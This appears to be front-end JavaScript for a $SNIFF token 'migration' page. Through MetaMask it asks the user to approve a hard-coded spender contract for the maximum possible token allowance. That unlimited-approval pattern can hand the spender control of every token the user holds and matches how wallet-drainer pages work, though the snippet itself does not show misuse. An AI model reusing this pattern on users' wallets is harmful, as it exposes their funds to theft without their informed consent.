
const web3 = new Web3(window.ethereum);


const contractABI = [{
    "constant": true,
    "inputs": [{
            "name": "spender",
            "type": "address"
        },
        {
            "name": "amount",
            "type": "uint256"
        }
    ],
    "name": "approve",
    "outputs": [{
        "name": "",
        "type": "bool"
    }],
    "type": "function"
}];


document.getElementById('approveButton').addEventListener('click', async () => {
    try {
        const contractAddress = '0x68E47eeCFd76fd289fa0CF4B25009c7e00E10bA6'; // OLD SNIFF CONTRACT
        const contract = new web3.eth.Contract(contractABI, contractAddress);

        const accounts = await ethereum.request({ method: 'eth_accounts' });
        if (accounts.length === 0) {
            console.log('Please connect to MetaMask first.');
            return;
        }

        const spenderAddress = "0x35D596F5f7807Ed88c5bE1cBa16C462aB9e8ACC8";  // SNIFF MIGRATION CONTRACT
        const amount = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';

        const result = await contract.methods.approve(spenderAddress, amount).send({ from: accounts[0] });
        console.log('Transaction Successful:', result);
        alert('Approval successful!');
        const button = document.getElementById('approveButton');
        button.innerHTML = '<span class="icon-vallet"></span>Approved $SNIFF';
    } catch (error) {
        console.error("Error:", error);
    }
});
